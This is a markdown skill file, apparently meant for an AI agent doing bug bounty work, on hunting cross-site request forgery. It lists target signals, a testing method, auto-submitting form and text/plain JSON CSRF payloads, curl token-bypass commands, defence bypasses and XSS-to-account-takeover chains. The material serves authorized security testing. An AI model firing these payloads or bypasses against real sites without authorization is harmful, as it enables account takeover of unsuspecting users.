---
name: hunt-csrf
description: Hunting skill for csrf vulnerabilities. Built from 10 public bug bounty reports. Use when hunting csrf on any target.
sources: github, hackerone_public
report_count: 10
---

## Crown Jewel Targets

CSRF becomes high-value when it touches **state-changing actions with account-level or financial consequences**. The highest-paying targets are:

- **Account takeover vectors**: OAuth/SSO flows (RelayState manipulation), social account linking/unlinking (Oculus-Facebook, SocialClub), import-friends features that expose OAuth tokens
- **Authentication infrastructure**: Login CSRF, session fixation via CSRF, forced account association
- **API endpoints accepting cross-origin POST**: JSON APIs, heartbeat/activity APIs, anything that skips Content-Type enforcement
- **Third-party integrations**: Grafana, monitoring dashboards, embedded analytics — often lag on CSRF protections
- **Social platforms**: Twitter/X collections, friend imports, social graph mutations — high-volume, authenticated actions with real user impact

**Asset types that pay most:** Core product auth flows > API gateways > third-party integrations running on subdomains > admin panels.

---

## Attack Surface Signals

### URL Patterns
```
/oauth/authorize?RelayState=
/accounts/link
/import/friends
/api/v*/heartbeat
/api/v*/collect
/monitoring/* (Grafana, Prow, Prometheus)
/auth/saml/callback
/connect/* (social integrations)
```

### Response Header Signals
```
# Missing or weak SameSite cookie attributes
Set-Cookie: session=abc123; HttpOnly        # no SameSite = vulnerable
Set-Cookie: session=abc123; SameSite=None   # explicitly allows cross-site

# Missing CSRF headers
# No X-Frame-Options or permissive CORS
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true      # dangerous combo
```

### JS / DOM Patterns
```javascript
// Static or predictable CSRF tokens
meta[name="csrf-token"]   // grep if value changes across sessions
authenticity_token        // Rails — check if reused across page loads

// JSON endpoints without Content-Type enforcement
fetch('/api/heartbeat', {method: 'POST', body: JSON.stringify(data)})

// No CSRF token in form at all
<form method="POST" action="/accounts/link">  // no hidden token field
```

### Tech Stack Signals
- **Rails apps**: Look for `authenticity_token` — test if it's static per session
- **Django apps**: Check `csrfmiddlewaretoken` — test cross-user/session reuse
- **Grafana instances**: CVE-2022-21703 — check version via `/api/health`
- **SAMLv2/OIDC flows**: `RelayState` parameter rarely validated
- **Express/Node APIs**: Often skip CSRF middleware on `/api/*` routes

---

## Step-by-Step Hunting Methodology

1. **Map all state-changing endpoints** — Spider authenticated session, filter for POST/PUT/DELETE/PATCH. Note every form and AJAX call.

2. **Check cookie SameSite attributes** — In DevTools → Application → Cookies. Flag any session cookie without `SameSite=Strict` or `Lax`.

3. **Test token staticness** — Log in twice (different sessions or incognito). Compare `authenticity_token` / `csrfmiddlewaretoken` / `csrf-token` values across:
   - Same session, different page loads (should be different)
   - Different sessions for same user
   - Different users entirely

4. **Test token omission** — Remove the CSRF token field entirely from a POST request. If the server returns 200, you have CSRF.

5. **Test token substitution** — Replace the token with one from a different session. Server accepting it = broken validation.

6. **Test JSON endpoints for form-POST CSRF** — Check if Content-Type is enforced:
   - Send `application/x-www-form-urlencoded` to a JSON endpoint
   - Send `text/plain` with a JSON body
   - If accepted, HTML form can trigger it cross-origin

7. **Hunt OAuth/SSO RelayState** — Intercept SAML/OIDC flows. Test if `RelayState` is validated for same-origin. Inject external URLs.

8. **Check social linking flows** — Every "connect your X account" feature. These often use redirect-based OAuth where CSRF on the callback can associate an attacker's social account.

9. **Test third-party dashboards on subdomains** — Grafana, Kibana, Prometheus. Check version, apply known CVEs, test default CSRF posture.

10. **Build PoC HTML page** — Host on a different origin, fire the request, confirm cookies are sent and action executes.

---

## Payload & Detection Patterns

### Basic CSRF PoC (Form POST)
```html
<html>
<body onload="document.forms[0].submit()">
  <form method="POST" action="https://target.com/api/v1/account/link">
    <input type="hidden" name="provider" value="attacker_account_id" />
    <input type="hidden" name="token" value="oauth_token_here" />
  </form>
</body>
</html>
```

### JSON CSRF via text/plain (bypasses Content-Type check)
```html
<html>
<body onload="document.forms[0].submit()">
  <form method="POST" action="https://target.com/api/heartbeat"
        enctype="text/plain">
    <!-- browser sends: {"status":"ok","x":"=padding"} -->
    <input type="hidden" name='{"status":"ok","x":"' value='padding"}' />
  </form>
</body>
</html>
```

### curl: Test CSRF token omission
```bash
# Capture a valid request, then replay without token
curl -s -X POST https://target.com/settings/email \
  -H "Cookie: session=YOUR_SESSION" \
  -d "email=attacker@evil.com" \
  -v 2>&1 | grep -E "HTTP|location|error"
```

### curl: Test token reuse across sessions
```bash
# Get token from session A
TOKEN_A=$(curl -s https://target.com/settings -H "Cookie: session=SESSION_A" \
  | grep -oP 'authenticity_token[^"]*value="\K[^"]+')

# Use token A in session B's request
curl -s -X POST https://target.com/settings/update \
  -H "Cookie: session=SESSION_B" \
  -d "authenticity_token=$TOKEN_A&email=test@test.com" \
  -v
```

### Grep patterns for recon
```bash
# Find CSRF token fields in HTML responses
grep -Eo 'name="(csrf|_token|authenticity_token|csrfmiddlewaretoken)"[^>]*value="[^"]+"'

# Find forms without CSRF tokens
grep -B5 -A20 '<form method="[Pp][Oo][Ss][Tt]"' response.html | grep -L "csrf\|token\|nonce"

# Check SameSite in response headers
curl -sI https://target.com/login | grep -i "set-cookie"

# Find RelayState parameters
grep -r "RelayState" --include="*.js" .
```

### Grafana CVE-2022-21703 version check
```bash
curl -s https://monitoring.target.com/api/health | jq '.version'
# Vulnerable: < 8.3.5, < 8.4.3, < 7.5.15
```

---

## Common Root Causes

1. **Static CSRF tokens per session** — Developers generate one token at login and reuse it. Airbnb bug: `authenticity_token` was the same across all page loads for a session, making it trivially leakable.

2. **Token not tied to user identity** — Token is valid server-wide or rotates on a schedule, not per-user/session. Mozilla bug: `csrftoken` reusable across users.

3. **Missing token on "secondary" endpoints** — Developers protect login/signup but forget API endpoints, import flows, or webhook handlers.

4. **JSON API assumption of safety** — Belief that `Content-Type: application/json` prevents CSRF. It does via CORS preflight — unless the server also accepts `text/plain` or `application/x-www-form-urlencoded`.

5. **SameSite=None for cross-site embeds** — Developers set `SameSite=None` to support iframe embeds or third-party integrations, inadvertently re-enabling CSRF.

6. **OAuth RelayState not validated** — Developers implement SAML/OIDC but treat `RelayState` as a redirect hint, not a CSRF state parameter requiring cryptographic binding.

7. **Framework misconfiguration** — CSRF middleware excluded for `/api/*` routes in Django/Rails because "API clients don't need it," but browser-based JS clients do.

8. **Third-party software defaults** — Grafana, Kibana, Jenkins shipped with weak or no CSRF protection in older versions; teams don't patch or check.

---

## Bypass Techniques

### Defense: SameSite=Lax cookies
**Bypass:** Top-level navigation GET requests still work. If the sensitive action can be triggered via GET (or if a redirect chain converts POST→GET), Lax doesn't protect it. Also: subdomains can still set cookies for parent domain.

### Defense: CSRF token present
**Bypasses:**
- Token is static per session — steal via XSS, Referer leakage, or cached page
- Token not validated server-side — just remove it and try
- Token validated by length/format only — submit a fake but correctly-formatted value
- Token tied to session but session is predictable

### Defense: `Content-Type: application/json` enforcement
**Bypass:** Use `text/plain` enctype with crafted form input names that produce valid JSON. Server receives JSON body, skips CORS preflight.

### Defense: Referer/Origin header check
**Bypasses:**
- Null Origin: use sandboxed iframe (`<iframe sandbox="allow-scripts allow-forms">`)
- Subdomain bypass: if `*.target.com` is trusted and you have XSS on any subdomain
- Referer stripping: HTTPS→HTTP transitions strip Referer header
- Weak matching: `target.com.evil.com` passes naive string matching

### Defense: Double-submit cookie pattern
**Bypass:** If attacker can set cookies (subdomain takeover, cookie injection via HTTP), they can set both the cookie and the form field to matching attacker-controlled values.

### Defense: Custom request header (e.g., `X-Requested-With`)
**Bypass:** Simple requests (form POST, `text/plain`) don't trigger preflight and can't set custom headers — but some servers only check for header *presence*, not value, and some frameworks accept requests without it.

---

## Gate 0 Validation

1. **What can the attacker DO right now?** — The attacker must be able to trigger a specific state-changing action (account linking, email change, data deletion, social association) on behalf of the victim without any interaction beyond visiting a URL or page.

2. **What does the victim LOSE?** — Identify the concrete harm: account access (ATO), data exposure, financial loss, reputation damage. "A CSRF token is missing" is not impact — "attacker can link their Oculus account to victim's Facebook account, gaining full profile access" is impact.

3. **Can it be reproduced in 10 minutes from scratch?** — You must be able to: (a) create attacker and victim accounts, (b) host a static HTML PoC, (c) have victim visit PoC, (d) confirm the action executed in victim's account — all within 10 minutes with no additional prerequisites.

---

## Real Impact Examples

### Scenario 1: Social Account Takeover via Import Friends (Rockstar Games)
An attacker crafted a malicious page targeting the "Import Friends" OAuth integration. When an authenticated SocialClub user visited the page, the CSRF triggered the OAuth token exchange with an attacker-controlled social account. The victim's SocialClub account became permanently linked to the attacker's Facebook/social identity, enabling full account access without the victim's knowledge. Rated high severity due to complete account compromise path.

### Scenario 2: Facebook Account Hijacking via Oculus Integration CSRF
During Oculus-Facebook account linking, the OAuth callback lacked proper CSRF state validation. An attacker could craft a URL that, when loaded by an authenticated Facebook user who had started the Oculus linking flow, would associate the attacker's Oculus device credentials with the victim's Facebook account. The attacker then had persistent access to the victim's Facebook profile through the Oculus app. The attack required only that the victim click a link while logged into Facebook.

### Scenario 3: JSON API CSRF on Heartbeat/Activity Tracking
A POST endpoint accepting `application/json` was assumed CSRF-safe by developers. A researcher crafted an HTML form using `enctype="text/plain"` with an input name designed to produce syntactically valid JSON when submitted. The browser sent the request cross-origin without a preflight (no custom headers, `text/plain` is a simple request), cookies were attached, and the server processed the JSON body as legitimate — silently logging attacker-controlled activity data under the victim's account identity.

---

## Related Skills & Chains

- **`hunt-xss`** — Any XSS on a trusted origin neutralizes CSRF defenses (token, SameSite, Origin check) instantly. Chain primitive: XSS reads the `meta[name=csrf-token]` value and same-origin-fetches `/accounts/email` with attacker payload → one-click ATO via attacker-page postMessage triggering the stored XSS to perform the state change.
- **`hunt-auth-bypass`** — CSRF combined with an auth-bypass primitive lets attacker-side scripts perform state changes that should have required step-up auth. Chain primitive: CSRF on `/settings/password` reaches an endpoint that skips the re-auth check → password change executes without the victim ever entering their current password → ATO.
- **`hunt-oauth`** — OAuth/SAML `state`/`RelayState` is structurally a CSRF token; missing validation here is account-linking CSRF. Chain primitive: attacker initiates OAuth on their account, sends victim the `/callback?code=X&state=` URL → victim's logged-in browser completes the link → attacker's social identity now controls victim's account.
- **`security-arsenal`** — Reach for the CSRF PoC templates (form POST, `enctype=text/plain` JSON, sandboxed-iframe null-origin, base64 multipart bypass) before writing one from scratch; also the WAF-bypass header variants for Origin/Referer checks.
- **`triage-validation`** — Run the Pre-Severity Gate before submitting CSRF on a logout endpoint or any action without state-change consequence — those are the canonical N/A traps. Confirm victim LOSES something concrete (account access, money, data), not just "a request executed."